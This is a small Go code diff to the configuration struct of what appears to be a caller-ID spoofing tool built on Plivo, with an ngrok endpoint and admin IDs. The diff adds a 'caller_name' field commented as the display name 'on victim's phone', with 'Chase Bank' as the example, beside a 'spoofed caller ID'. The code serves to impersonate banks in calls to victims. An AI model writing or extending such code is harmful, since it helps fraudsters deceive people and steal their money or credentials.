@@ -17,7 +17,8 @@ type Config struct {
 	PlivoAuthID    string  `yaml:"plivo_auth_id"`
 	PlivoAuthToken string  `yaml:"plivo_auth_token"`
 	PlivoNumber    string  `yaml:"plivo_number"`
-	CallerID       string  `yaml:"caller_id"` // Spoofed caller ID (verified number)
+	CallerID       string  `yaml:"caller_id"`      // Spoofed caller ID number (must be verified in Plivo)
+	CallerName     string  `yaml:"caller_name"`    // Display name on victim's phone (e.g., "Chase Bank")
 	AdminIDs       []int64 `yaml:"admin_ids"`
 	NgrokURL       string  `yaml:"ngrok_url"`
 	Port           string  `yaml:"port"`
